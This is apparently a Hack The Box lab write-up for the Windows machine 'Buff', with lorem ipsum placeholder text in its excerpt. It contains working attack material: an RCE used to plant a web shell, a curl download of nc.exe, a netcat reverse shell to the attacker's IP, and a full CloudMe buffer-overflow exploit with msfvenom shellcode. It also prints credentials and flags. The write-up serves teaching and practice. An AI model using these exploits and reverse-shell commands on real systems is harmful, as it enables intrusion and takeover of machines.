---
layout: single
title: Buff - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-07-27
classes: wide
header:
  teaser: /assets/images/htb-writeup-buff/buff_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-buff/buff_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@nidus:~# nmap -Pn -sC -sV -n 10.10.10.198
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-27 08:52 CEST
    Nmap scan report for 10.10.10.198
    Host is up (0.027s latency).
    Not shown: 999 filtered ports
    PORT     STATE SERVICE VERSION
    8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
    | http-open-proxy: Potentially OPEN proxy.
    |_Methods supported:CONNECTION
    |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
    |_http-title: mrb3n's Bro Hut


2. Browsing the webpage under Contact we find the information "Made using Gym Management Software 1.0". A quick google for exploits
   the first result that comes up is an unauthenticated RCE. Download and run the python script:

   root@nidus:/git/htb/buff# python rce.py http://10.10.10.198:8080/
                 /\
     /vvvvvvvvvvvv \--------------------------------------,
     `^^^^^^^^^^^^ /============BOKU====================="
                 \/

     [+] Successfully connected to webshell.
     C:\xampp\htdocs\gym\upload> whoami
      �PNG
      �
      buff\shaun


3. The shell is basic and we are unable to traverse the directories. Upload nc.exe and use it to get a workable shell.

    From my browser:
      http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl -O 10.10.14.4:8888/nc.exe

    C:\xampp\htdocs\gym\upload> nc.exe 10.10.14.4 4488 -e powershell

    root@nidus:~# rlwrap nc -lvnp 4488
      listening on [any] 4488 ...
      connect to [10.10.14.4] from (UNKNOWN) [10.10.10.198] 50355
      Windows PowerShell
      Copyright (C) Microsoft Corporation. All rights reserved.

      PS C:\xampp\htdocs\gym\upload>

   Traversing to the gym directory we find "New Text Document.txt" containing database information. Possible rabbit hole?

     PS C:\xampp\htdocs\gym> type "New Text Document.txt"
      type "New Text Document.txt"
      $mysql_host = "mysql16.000webhost.com";
      $mysql_database = "a8743500_secure";
      $mysql_user = "a8743500_secure";
      $mysql_password = "ipad12345";


4. Go and grab user.txt
    PS C:\Users\shaun\Desktop> cat user.txt
      cat user.txt
      1a2e0b6779aa060fc44a5575a0a88926


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Enumerate the box using winPEAS gives us nothing of use. Browsing the directories of shaun we find the file CloudMe_1112.exe,
   a quick google on that file shows us that it's vulnerable to buffer overflow. CloudMe runs on port 8888 and can be verified by
   executing the .exe-file and then run netstat.
   C:\Users\shaun\Downloads>netstat -ano
    netstat -ano

    Active Connections
      Proto  Local Address          Foreign Address        State           PID
      TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       1472


   Prepare the exploit and create the payload reverse shell. Save the binary data (buf-lines) is your payload.
     root@nidus:/git/htb/buff# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4499 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
      [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
      [-] No arch selected, selecting arch: x86 from the payload
      Found 11 compatible encoders
      Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
      x86/shikata_ga_nai succeeded with size 351 (iteration=0)
      x86/shikata_ga_nai chosen with final size 351
      Payload size: 351 bytes
      Final size of python file: 1712 bytes
      buf =  b""
      buf += b"\xb8\x2e\x4a\xaf\xad\xda\xcf\xd9\x74\x24\xf4\x5e\x31"
      buf += b"\xc9\xb1\x52\x31\x46\x12\x83\xc6\x04\x03\x68\x44\x4d"
      buf += b"\x58\x88\xb0\x13\xa3\x70\x41\x74\x2d\x95\x70\xb4\x49"
      buf += b"\xde\x23\x04\x19\xb2\xcf\xef\x4f\x26\x5b\x9d\x47\x49"
      buf += b"\xec\x28\xbe\x64\xed\x01\x82\xe7\x6d\x58\xd7\xc7\x4c"
      buf += b"\x93\x2a\x06\x88\xce\xc7\x5a\x41\x84\x7a\x4a\xe6\xd0"
      buf += b"\x46\xe1\xb4\xf5\xce\x16\x0c\xf7\xff\x89\x06\xae\xdf"
      buf += b"\x28\xca\xda\x69\x32\x0f\xe6\x20\xc9\xfb\x9c\xb2\x1b"
      buf += b"\x32\x5c\x18\x62\xfa\xaf\x60\xa3\x3d\x50\x17\xdd\x3d"
      buf += b"\xed\x20\x1a\x3f\x29\xa4\xb8\xe7\xba\x1e\x64\x19\x6e"
      buf += b"\xf8\xef\x15\xdb\x8e\xb7\x39\xda\x43\xcc\x46\x57\x62"
      buf += b"\x02\xcf\x23\x41\x86\x8b\xf0\xe8\x9f\x71\x56\x14\xff"
      buf += b"\xd9\x07\xb0\x74\xf7\x5c\xc9\xd7\x90\x91\xe0\xe7\x60"
      buf += b"\xbe\x73\x94\x52\x61\x28\x32\xdf\xea\xf6\xc5\x20\xc1"
      buf += b"\x4f\x59\xdf\xea\xaf\x70\x24\xbe\xff\xea\x8d\xbf\x6b"
      buf += b"\xea\x32\x6a\x3b\xba\x9c\xc5\xfc\x6a\x5d\xb6\x94\x60"
      buf += b"\x52\xe9\x85\x8b\xb8\x82\x2c\x76\x2b\xa7\xba\x76\xaf"
      buf += b"\xdf\xb8\x86\xbe\x8c\x34\x60\xaa\xa2\x10\x3b\x43\x5a"
      buf += b"\x39\xb7\xf2\xa3\x97\xb2\x35\x2f\x14\x43\xfb\xd8\x51"
      buf += b"\x57\x6c\x29\x2c\x05\x3b\x36\x9a\x21\xa7\xa5\x41\xb1"
      buf += b"\xae\xd5\xdd\xe6\xe7\x28\x14\x62\x1a\x12\x8e\x90\xe7"
      buf += b"\xc2\xe9\x10\x3c\x37\xf7\x99\xb1\x03\xd3\x89\x0f\x8b"
      buf += b"\x5f\xfd\xdf\xda\x09\xab\x99\xb4\xfb\x05\x70\x6a\x52"
      buf += b"\xc1\x05\x40\x65\x97\x09\x8d\x13\x77\xbb\x78\x62\x88"
      buf += b"\x74\xed\x62\xf1\x68\x8d\x8d\x28\x29\xad\x6f\xf8\x44"
      buf += b"\x46\x36\x69\xe5\x0b\xc9\x44\x2a\x32\x4a\x6c\xd3\xc1"
      buf += b"\x52\x05\xd6\x8e\xd4\xf6\xaa\x9f\xb0\xf8\x19\x9f\x90"

   Modify the exploit script and change the payload to your reverse shell.

     root@nidus:/git/htb/buff# cat root-exploit.py
      import socket

      target = "127.0.0.1"

      padding1   = b"\x90" * 1052
      EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
      NOPS       = b"\x90" * 30

      #msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4499 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
      payload =  b""
      payload += b"\xda\xd3\xd9\x74\x24\xf4\xbe\x2c\x9a\xa7\xd2\x5f\x29"
      payload += b"\xc9\xb1\x52\x83\xc7\x04\x31\x77\x13\x03\x5b\x89\x45"
      payload += b"\x27\x5f\x45\x0b\xc8\x9f\x96\x6c\x40\x7a\xa7\xac\x36"
      payload += b"\x0f\x98\x1c\x3c\x5d\x15\xd6\x10\x75\xae\x9a\xbc\x7a"
      payload += b"\x07\x10\x9b\xb5\x98\x09\xdf\xd4\x1a\x50\x0c\x36\x22"
      payload += b"\x9b\x41\x37\x63\xc6\xa8\x65\x3c\x8c\x1f\x99\x49\xd8"
      payload += b"\xa3\x12\x01\xcc\xa3\xc7\xd2\xef\x82\x56\x68\xb6\x04"
      payload += b"\x59\xbd\xc2\x0c\x41\xa2\xef\xc7\xfa\x10\x9b\xd9\x2a"
      payload += b"\x69\x64\x75\x13\x45\x97\x87\x54\x62\x48\xf2\xac\x90"
      payload += b"\xf5\x05\x6b\xea\x21\x83\x6f\x4c\xa1\x33\x4b\x6c\x66"
      payload += b"\xa5\x18\x62\xc3\xa1\x46\x67\xd2\x66\xfd\x93\x5f\x89"
      payload += b"\xd1\x15\x1b\xae\xf5\x7e\xff\xcf\xac\xda\xae\xf0\xae"
      payload += b"\x84\x0f\x55\xa5\x29\x5b\xe4\xe4\x25\xa8\xc5\x16\xb6"
      payload += b"\xa6\x5e\x65\x84\x69\xf5\xe1\xa4\xe2\xd3\xf6\xcb\xd8"
      payload += b"\xa4\x68\x32\xe3\xd4\xa1\xf1\xb7\x84\xd9\xd0\xb7\x4e"
      payload += b"\x19\xdc\x6d\xc0\x49\x72\xde\xa1\x39\x32\x8e\x49\x53"
      payload += b"\xbd\xf1\x6a\x5c\x17\x9a\x01\xa7\xf0\xaf\xdf\xa9\x04"
      payload += b"\xd8\xdd\xb5\x15\x8b\x6b\x53\x7f\xbb\x3d\xcc\xe8\x22"
      payload += b"\x64\x86\x89\xab\xb2\xe3\x8a\x20\x31\x14\x44\xc1\x3c"
      payload += b"\x06\x31\x21\x0b\x74\x94\x3e\xa1\x10\x7a\xac\x2e\xe0"
      payload += b"\xf5\xcd\xf8\xb7\x52\x23\xf1\x5d\x4f\x1a\xab\x43\x92"
      payload += b"\xfa\x94\xc7\x49\x3f\x1a\xc6\x1c\x7b\x38\xd8\xd8\x84"
      payload += b"\x04\x8c\xb4\xd2\xd2\x7a\x73\x8d\x94\xd4\x2d\x62\x7f"
      payload += b"\xb0\xa8\x48\x40\xc6\xb4\x84\x36\x26\x04\x71\x0f\x59"
      payload += b"\xa9\x15\x87\x22\xd7\x85\x68\xf9\x53\xa5\x8a\x2b\xae"
      payload += b"\x4e\x13\xbe\x13\x13\xa4\x15\x57\x2a\x27\x9f\x28\xc9"
      payload += b"\x37\xea\x2d\x95\xff\x07\x5c\x86\x95\x27\xf3\xa7\xbf"

      overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

      buf = padding1 + EIP + NOPS + payload + overrun

      try:
      	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      	s.connect((target,8888))
      	s.send(buf)
      except Exception as e:
      	print(sys.exc_value)


2. The script needs to be executed on the local box, as the victim doesn't have python installed. Create a reverse port forward using plink.

   Upload plink:
     PS C:\Users\shaun\Downloads> invoke-webrequest -uri "http://10.10.14.4:8877/plink.exe" -outfile "C:\Users\shaun\Downloads\plink.exe"

   Setup the reverse port forward using the following syntax:
    ./plink.exe <ATTACKER-IP> <ATTACKER-PORT>:127.0.0.1:<LOCAL-SERVICE-PORT>

    PS C:\Users\shaun\Downloads> ./plink.exe 10.10.14.4 -R 8888:127.0.0.1:8888
      ./plink.exe 10.10.14.4 -R 8888:127.0.0.1:8888
      The server's host key is not cached in the registry. You
      have no guarantee that the server is the computer you
      think it is.
      The server's ssh-ed25519 key fingerprint is:
      ssh-ed25519 255 6a:d5:96:27:f9:c4:a0:c4:49:86:6d:2d:0e:76:7f:81
      If you trust this host, enter "y" to add the key to
      PuTTY's cache and carry on connecting.
      If you want to carry on connecting just once, without
      adding the key to the cache, enter "n".
      If you do not trust this host, press Return to abandon the
      connection.
      Store key in cache? (y/n) y
      login as: p3
      p3@10.10.14.4's password: ********


3. Setup a new listener to capture the reverse shell from the exploit, and then execute the script. Grab root.txt

    root@nidus:/git/htb/buff# python root-exploit.py
    root@nidus:~# rlwrap nc -lvnp 4499
      listening on [any] 4499 ...
      connect to [10.10.14.4] from (UNKNOWN) [10.10.10.198] 49709
      Microsoft Windows [Version 10.0.17134.1610]
      (c) 2018 Microsoft Corporation. All rights reserved.

      C:\Windows\system32>whoami
      whoami
      buff\administrator

      C:\Windows\system32>cd C:\Users\Administrator\Desktop
      cd C:\Users\Administrator\Desktop

      C:\Users\Administrator\Desktop>type root.txt
      type root.txt
      d19eb6d412b70730c11484d0e0076c3b


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Gym Management Software 1.0 RCE:
  https://www.exploit-db.com/exploits/48506

CloudMe_1112 Buffer Overflow:
  https://www.exploit-db.com/exploits/48389
